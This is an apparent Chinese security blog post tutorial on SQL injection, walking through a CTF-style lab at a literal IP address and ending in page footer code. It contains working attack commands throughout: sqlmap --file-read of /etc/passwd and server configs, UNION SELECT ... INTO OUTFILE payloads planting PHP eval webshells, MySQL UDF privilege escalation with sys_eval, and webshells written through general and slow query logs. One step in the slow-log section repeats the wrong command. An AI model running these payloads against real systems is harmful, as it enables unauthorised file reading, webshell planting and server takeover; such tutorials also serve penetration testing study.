<h2 id="如何寻找web文件路径"><a href="#如何寻找web文件路径" class="headerlink" title="如何寻找web文件路径"></a>如何寻找web文件路径</h2><p>web应用的位置默认都在**&#x2F;var&#x2F;www&#x2F;html&#x2F;，<strong>我们一般网页的文件都是在这上面，但是如果开发者设计的话可以在</strong>&#x2F;var&#x2F;www&#x2F;html&#x2F;** 后修改网页文件存放位置。</p>
<h3 id="利用mysql的函数"><a href="#利用mysql的函数" class="headerlink" title="利用mysql的函数"></a>利用mysql的函数</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &#x27;http://106.15.50.112:8023/?r=content&amp;cid=15&#x27; --dbms &quot;mysql&quot;  --file-read &quot;/etc/passwd&quot; --technique U</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641605b6b76b.png" alt="image-20240309215148900"></p>
<p> 当然 sqlmap得到得信息不会显示出来，而是会在保存在sqlmap的文件夹中。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641605b6ea6c.png" alt="image-20240309215429365"></p>
<p> 找到文件位置，打开文件（注意是  .local   有个 “.” 需要注意）</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641605cdfbf8.png" alt="image-20240309215307860"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641605d7e868.png" alt="image-20240309215451151"></p>
<p> 没有关键信息，我们再查看其他的配置文件（这种文件名，一般情况都是默认）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &#x27;http://106.15.50.112:8023/?r=content&amp;cid=15&#x27; --dbms &quot;mysql&quot;  --file-read &quot;/etc/init.d/httpd&quot; --technique U</span><br></pre></td></tr></table></figure>


<p>得到关键config文件的路径</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641605c966bf.png" alt="image-20240309215530002"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &#x27;http://106.15.50.112:8023/?r=content&amp;cid=15&#x27; --dbms &quot;mysql&quot;  --file-read &quot;/etc/httpd/conf/httpd.conf&quot; --technique U</span><br></pre></td></tr></table></figure>


<p>找到的web文件放置的路径，这就是我们要上传木马的路径</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641605c97a1f.png" alt="image-20240309215547389"></p>
<p> 接下来手动用sqlmap 写马都可以，这里选的是手动</p>
<p>写马POC</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://106.15.50.112:8023/?r=content&amp;cid=-1%20and(1)UNION SELECT 1,2,3,4,5,6,7,8,9,10,&lt;?php @eval($_REQUEST[&#x27;aaa&#x27;]);?&gt;,12,13 into outfile &quot;/var/www/html/whalwl/aaa.php&quot;</span><br></pre></td></tr></table></figure>


<p>继续检测</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641605ba3e3b.png" alt="image-20240309220011003"></p>
<p> 这里又失败了，为什么了呢？，又涉及到经验问题了，服务器一般不会给web根目录写文件的权限（实际上能sql注入写马的条件比较苛刻），不过我们可以继续寻找子文件夹，看是否能上传。</p>
<p>下面也不啰嗦了，发现，直接是能上传到 image 目录下，</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://106.15.50.112:8023/?r=content&amp;cid=-1%20and(1)UNION SELECT 1,2,3,4,5,6,7,8,9,10,&quot;&lt;?php @eval($_REQUEST[&#x27;aaa&#x27;]);?&gt;&quot;,12,13 into outfile &quot;/var/www/html/whalwl/images/aaa.php&quot;</span><br></pre></td></tr></table></figure>


<p> shell管理工具连接</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641605c791fd.png" alt="image-20240309220056634"></p>
<p> 看到flag<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641605deedfe.png" alt="image-20240309220112713"></p>
<h3 id="–sql-shell"><a href="#–sql-shell" class="headerlink" title="–sql-shell"></a>–sql-shell</h3><p>我们可以先使用这个来执行一些sql语句</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap.py -u &quot;xxx&quot; --sql-shell</span><br></pre></td></tr></table></figure>

<p>查看文件路径（mysql&#x2F;data的路径，根目录一般与mysql处于同一目录）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select @@datadir;</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641605cf2308.png" alt="image-20240309211749043"></p>
<p>查看secure_file_priv的值是否为空</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select @@secure_file_priv </span><br></pre></td></tr></table></figure>

<p>如下为null，无法写入</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641605b3bf4b.png" alt="image-20240309211650715"></p>
<p>当为空的时候则什么都不返回</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641605c297d1.png" alt="image-20240309211636404"></p>
<h3 id="其他方法"><a href="#其他方法" class="headerlink" title="其他方法"></a>其他方法</h3><p>1.phpinfo()</p>
<p>2.随便传入参数 报错 可能有相关信息</p>
<p>3.指纹信息收集</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641605daaac3.png" alt="image-20240310122613276"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>在实际上我们用木马连接后，权限可能很小</p>
<p>详细如下：<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/network/268221.html">提权详解</a></p>
<p>这里采用UDF提权的方法</p>
<p><strong>这里的udf提权是应用程序或服务提权</strong></p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/283566.html">UDF提权详解</a></p>
<p>udf 全称为：user defined function，意为<strong>用户自定义函数</strong>；用户可以添加自定义的新函数到Mysql中，以达到功能的扩充，调用方式与一般系统自带的函数相同，例如 contact()，user()，version()等函数。</p>
<p><strong>提权步骤</strong></p>
<blockquote>
<p>1.把含有自定义函数(如执行系统调用函数“sys_eval”)的dll文件(如linux为so文件等)放入特定文件夹下</p>
<p>2.声明引用这个dll文件中的自定义函数</p>
<p>3.使用这个自定义的函数系统调用完成提权</p>
</blockquote>
<p>udf 文件后缀一般为 dll，由C、C++编写</p>
<blockquote>
<p>先到sqlmap上找到udf文件，要注意到这个文件的后缀是so_,不是so ，所以还需要编译一下，具体原因请仔细看上方链接。</p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641605c14b31.png" alt="image-20240309220935476"></p>
<p>利用 cloak.py 给 udf文件解码</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641605bbb1ee.png" alt="image-20240309220959335"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python cloak.py -d -i  lib_mysqludf_sys.so_</span><br></pre></td></tr></table></figure>

<p>修改名称为aaa.so</p>
<p>上传这个文件同样需要路径，这里又要引入一个新概念</p>
<p><strong>plugin</strong></p>
<p>plugin是插件的意思,通常是用与对某个现有的架构进行扩展。</p>
<p>我们把这个udf文件放入到plugin文件才能真正产生作用。</p>
<p>实施</p>
<blockquote>
<ol>
<li>找到数据库名称，密码</li>
<li>查找plugin路径</li>
<li>上传udf文件</li>
<li>执行系统命令</li>
</ol>
</blockquote>
<p>首先在配置文件找到了数据库登陆信息</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641605dd1fc9.png" alt="image-20240309221220889"></p>
<p>登陆数据库，查找plugin路径</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show variables like &#x27;%plugin%&#x27;</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641605cb9e55.png" alt="image-20240309221258584"></p>
<p> 在该路径把udf文件上传，aaa.so</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641605ea17da.png" alt="image-20240309221329629"></p>
<p> 之后在数据库输入命令，执行提权文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">create function sys_eval returns string soname &#x27;aaa.so&#x27;;</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641605ccef80.png" alt="image-20240309221355888"></p>
<p>命令执行打开flag</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641605cb5970.png" alt="image-20240309221424676"></p>
<blockquote>
<p>如果MySQL版本大于5.1，udf.dll文件必须放置在MySQL安装目录的lib\plugin文件夹下才可以创建自定义函数。该目录默认是不存在的，需要使用WebShall找到MySQL的安装目录，并在安装目录下创建lib\plugin文件夹，然后将udf.dll文件导出到该目录。</p>
<p>如果MySQL版本小于5.1,udf.dll文件在Windows Server 2003 下放置在C:\Windows\system32目录中</p>
</blockquote>
<h2 id="日志马"><a href="#日志马" class="headerlink" title="日志马"></a>日志马</h2><h3 id="全局日志写马"><a href="#全局日志写马" class="headerlink" title="全局日志写马"></a>全局日志写马</h3><p>我们所有的数据库的都有一个存放日志的文件，这个文件可以会进行记录数据库的操作语句，也可能不会记录数据库的操作语句，这却决于两个全局变量：</p>
<p><code>general_log</code>&#x3D;&#x3D;&gt;日志保存状态，有两个状态，ON代表开启 OFF代表关闭。</p>
<p><code>general_log_file</code>&#x3D;&#x3D;&gt; 日志的保存路径。</p>
<p><code>show global variables like &quot;%general_log%&quot;;</code> 查看这两个日志文件相关的配置</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641605bd88d3.png" alt="image-20240310185353991"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">D:\phpstudy_pro\Extensions\MySQL5.7.26\data\LAPTOP-R496QJ56.log</span><br></pre></td></tr></table></figure>

<p>可以看到这里的日志记录状态是处于关闭状态，那么我们需要设置以下使这个选项打开。<br><code>SET GLOBAL general_log=&#39;ON&#39;;</code> 打开日志记录</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641605b19121.png" alt="image-20240310185455069"></p>
<p><code>set global general_log_file=&#39;D:、\\phpstudy_pro\\WWW\\log.php&#39;; </code> 设置日志存储路径,写马，这里需要注意的就是需要使用双斜线，然后还有就是日志文件必须是.php文件防止不能被解析</p>
<p>设置完毕之后就是代表着所有的执行语句都会记录到日志文件当中，不管执行成功与否。</p>
<p><code>select &#39;&lt;?php assert($_POST[sss]);?&gt;&#39;;</code> 查询语句，其实就是写马，让日志文件众留下这样一句查询语句。那么可以使用这个木马了</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641605d83b57.png" alt="image-20240310192303309"></p>
<p>同样 也需要知道文件路径</p>
<h3 id="慢日志写马"><a href="#慢日志写马" class="headerlink" title="慢日志写马"></a>慢日志写马</h3><p>慢日志全称为慢查询日志（Slow Query Log），主要用来记录在 MySQL 中执行时间超过指定时间的 SQL 语句。通过慢查询日志，可以查找出哪些语句的执行效率低，以便进行优化。</p>
<p>默认情况下，MySQL 并没有开启慢日志，可以通过修改 slow_query_log 参数来打开慢日志。与慢日志相关的参数介绍如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">slow_query_log：是否启用慢查询日志，默认为0，可设置为0、1，1表示开启。</span><br><span class="line">slow_query_log_file：指定慢查询日志位置及名称，默认值为host_name-slow.log，可指定绝对路径。</span><br><span class="line">long_query_time：慢查询执行时间阈值，超过此时间会记录，默认为10，单位为s。</span><br><span class="line">log_output：慢查询日志输出目标，默认为file，即输出到文件。</span><br><span class="line">log_timestamps：主要是控制 error log、slow log、genera log 日志文件中的显示时区，默认使用UTC时区，建议改为 SYSTEM 系统时区。</span><br><span class="line">log_queries_not_using_indexes：是否记录所有未使用索引的查询语句，默认为off。</span><br><span class="line">min_examined_row_limit：对于查询扫描行数小于此参数的SQL，将不会记录到慢查询日志中，默认为0。</span><br><span class="line">log_slow_admin_statements：慢速管理语句是否写入慢日志中，管理语句包含 alter table、create index 等，默认为 off 即不写入。</span><br></pre></td></tr></table></figure>

<p>一般情况下，我们只需开启慢日志记录，配置下阈值时间，其余参数可按默认配置。对于阈值时间，可灵活调整，比如说可以设置为 1s 或 3s 。</p>
<p>在配置文件中，我们可以设置以下几个慢日志相关参数：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">慢查询日志相关配置，可根据实际情况修改</span><br><span class="line">vim /etc/my.cnf </span><br><span class="line">[mysqld] </span><br><span class="line">slow_query_log = 1</span><br><span class="line">slow_query_log_file = /data/mysql/logs/slow.log</span><br><span class="line">long_query_time = 1</span><br><span class="line">log_timestamps = SYSTEM</span><br><span class="line">log_output = FILE</span><br></pre></td></tr></table></figure>

<p>下面我们具体看下，慢日志会记录哪些内容？我们执行一条较慢的查询 SQL ，来看下在慢日志中的体现。</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line"># 该条SQL执行时间超过阈值</span><br><span class="line"></span><br><span class="line"># Time: 2021-05-13T17:38:03.687811+08:00</span><br><span class="line"># User@Host: root[root] @  [192.168.85.0]  Id: 2604943</span><br><span class="line"># Query_time: 1.099889  Lock_time: 0.000144 Rows_sent: 39  Rows_examined: 45305</span><br><span class="line">SET timestamp=1620898683;</span><br><span class="line">select * from test_table where col_name like &#x27;%测试%&#x27;;</span><br></pre></td></tr></table></figure>

<p>如果启用了慢速查询日志，并且选择了 FILE 作为输出目标，则写入日志的每个语句都以 # 字符开头。对于每一组慢SQL，第一行记录的是该条 SQL 执行的时刻（如果 log_timestamps 参数为 UTC ，则改时间会显示 UTC 时区时间），第二行记录的是执行该语句的用户和 IP 以及链接 id ，第三行的几个字段解释如下：</p>
<ul>
<li><strong>Query_time</strong>: duration 语句执行时间，以秒为单位。</li>
<li><strong>Lock_time</strong>: duration 获取锁的时间(以秒为单位)。</li>
<li><strong>Rows_sent</strong>: N 发送给 Client 端的行数。</li>
<li><strong>Rows_examined</strong>: N 服务器层检查的行数(不计算存储引擎内部的任何处理)。</li>
</ul>
<p>下面两行分别是此语句执行时候的时间戳和具体慢 SQL 。</p>
<p>在实际环境下，不建议开启 log_queries_not_using_indexes 参数，此参数打开后可能导致慢日志迅速增长。对于慢日志的筛选与分析，我们可以借助 mysqldumpslow、pt-query-digest 等工具来分析。对于慢日志文件，要定期进行归档处理，比如可以暂时关闭慢日志，然后将旧文件重命名，之后再开启慢日志，这样就会写入新的日志文件中，有效减小日志体积。</p>
<p>1.开启日志功能</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SET GLOBAL slow_query_log_file=&#x27;D:\\phpstudy_pro\\WWW\\shell.php&#x27;;</span><br></pre></td></tr></table></figure>

<p>2.设置日志存储路径</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SET GLOBAL slow_query_log_file=&#x27;D:\\phpstudy_pro\\WWW\\shell.php&#x27;;</span><br></pre></td></tr></table></figure>

<p>3.执行sql语句</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select &#x27;&lt;?php eval($_GET[H])?&gt;&#x27; or SLEEP(11);</span><br></pre></td></tr></table></figure>



<p>同样需要知道文件路径</p>
<h1 id="其他数据库"><a href="#其他数据库" class="headerlink" title="其他数据库"></a>其他数据库</h1><p>与前面的mysql的注入方式大同小异</p>
<h2 id="access数据库"><a href="#access数据库" class="headerlink" title="access数据库"></a>access数据库</h2><p>它的一些主要组件是表格、表单、报告和查询 没有库的概念</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641605e8b2b8.png" alt="image-20240310132018529"></p>
<p>也是可以用sql语句查询</p>
<p>也可以直接找到他的位置下下来</p>
<p>也就是说access数据库没有information_schema库</p>
<p>注入：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641605df291a.png" alt="image-20240310132912538"></p>
<p>不同的数据库报错回显不同</p>
<p>主要靠猜（爆破）</p>
<p>包括mysql5.0之前都是这样</p>
<p>通过exists来（有数据为true）</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641605b3dc70.png" alt="image-20240310134049972"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641605b4d1d4.png" alt="image-20240310134114047"></p>
<p>猜完表名、字段名后猜字段数据长度</p>
<p>用top函数 top&#x3D;limit</p>
<p>len&#x3D;lenth</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641605b270df.png" alt="image-20240310134029761"></p>
<p>然后猜字段数据内容</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641605b25a36.png" alt="image-20240310134416367"></p>
<p>asc&#x3D;ascii mid&#x3D;substr</p>
<p>也可以使用order by猜字段数目</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641605bd3271.png" alt="image-20240310135216187"></p>
<p>然后用union select</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641605d2d1e0.png" alt="image-20240310140308226"></p>
<p>mysql跨库查询</p>
<p>库名.表名</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641605bc7efa.png" alt="image-20240310140844487"></p>
<p>access的跨库查询更加苛刻</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641605ebfb84.png" alt="image-20240310142140165"></p>
<p>基本不用</p>
<h2 id="mssql数据库"><a href="#mssql数据库" class="headerlink" title="mssql数据库"></a>mssql数据库</h2><p>全称Microsoftsqlserver</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641605f18c89.png" alt="image-20240310142314985"></p>
<p>也是和mysql相似 只是报错信息不同</p>
<p>order by 3&#x3D;order by 1,2,3</p>
<p>sqlserver对数据类型严格</p>
<p>主要使用报错注入</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641605b4a234.png" alt="image-20240310142928752"></p>
<p>爆库</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641605b5340c.png" alt="image-20240310143914302"></p>
<p><code>&gt;0</code></p>
<p>也是猜库名</p>
<p>爆表</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641605dc2a19.png" alt="image-20240310182447077"></p>
<p>爆列</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641605c1498c.png" alt="image-20240310182531770"></p>
<p>爆数据</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641605d5c287.png" alt="image-20240310182615415"></p>
<p>针对mssql不同的权限有不同的注入手法</p>
</article><div class="post-copyright"><div class="copyright-cc-box"><i class="anzhiyufont anzhiyu-icon-copyright"></i></div><div class="post-copyright__author_box"><a class="post-copyright__author_img" href="/" title="头像"><img class="post-copyright__author_img_back" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" title="头像" alt="头像"><img class="post-copyright__author_img_front" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" title="头像" alt="头像"></a><div class="post-copyright__author_name">VVkladg0r</div><div class="post-copyright__author_desc"></div></div><div class="post-copyright__post__info"><a class="post-copyright__original" title="该文章为原创文章，注意版权协议" href="http://cszvvds.cc/2024/05/13/SQL%E6%B3%A8%E5%85%A5/">原创</a><a class="post-copyright-title"><span onclick="rm.copyPageUrl('http://cszvvds.cc/2024/05/13/SQL%E6%B3%A8%E5%85%A5/')">SQL注入</span></a></div><div class="post-tools" id="post-tools"><div class="post-tools-left"><div class="rewardLeftButton"><div class="post-reward" onclick="anzhiyu.addRewardMask()"><div class="reward-button button--animated" title="赞赏作者"><i class="anzhiyufont anzhiyu-icon-hand-heart-fill"></i>打赏作者</div><div class="reward-main"><div class="reward-all"><span class="reward-title">感谢你赐予我前进的力量</span><ul class="reward-group"><li class="reward-item"><a href="https://bu.dusays.com/2024/05/13/6640eacb0aad7.png" target="_blank"><img class="post-qr-code-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6640eacb0aad7.png" alt="微信"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://bu.dusays.com/2024/05/13/6640eacae5439.png" target="_blank"><img class="post-qr-code-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6640eacae5439.png" alt="支付宝"/></a><div class="post-qr-code-desc">支付宝</div></li></ul><a class="reward-main-btn" href="/about/#about-reward" target="_blank"><div class="reward-text">赞赏者名单</div><div class="reward-dec">因为你们的支持让我意识到写文章的价值🙏</div></a></div></div></div><div id="quit-box" onclick="anzhiyu.removeRewardMask()" style="display: none"></div></div><div class="shareRight"><div class="share-link mobile"><div class="share-qrcode"><div class="share-button" title="使用手机访问这篇文章"><i class="anzhiyufont anzhiyu-icon-qrcode"></i></div><div class="share-main"><div class="share-main-all"><div id="qrcode" title="http://cszvvds.cc/2024/05/13/SQL%E6%B3%A8%E5%85%A5/"></div><div class="reward-dec">使用手机访问这篇文章</div></div></div></div></div><div class="share-link weibo"><a class="share-button" target="_blank" href="https://service.weibo.com/share/share.php?title=SQL注入&amp;url=http://cszvvds.cc/2024/05/13/SQL%E6%B3%A8%E5%85%A5/&amp;pic=" rel="external nofollow noreferrer noopener"><i class="anzhiyufont anzhiyu-icon-weibo"></i></a></div><script>function copyCurrentPageUrl() {
  var currentPageUrl = window.location.href;
  var input = document.createElement("input");
  input.setAttribute("value", currentPageUrl);
  document.body.appendChild(input);
  input.select();
  input.setSelectionRange(0, 99999);
  document.execCommand("copy");
  document.body.removeChild(input);
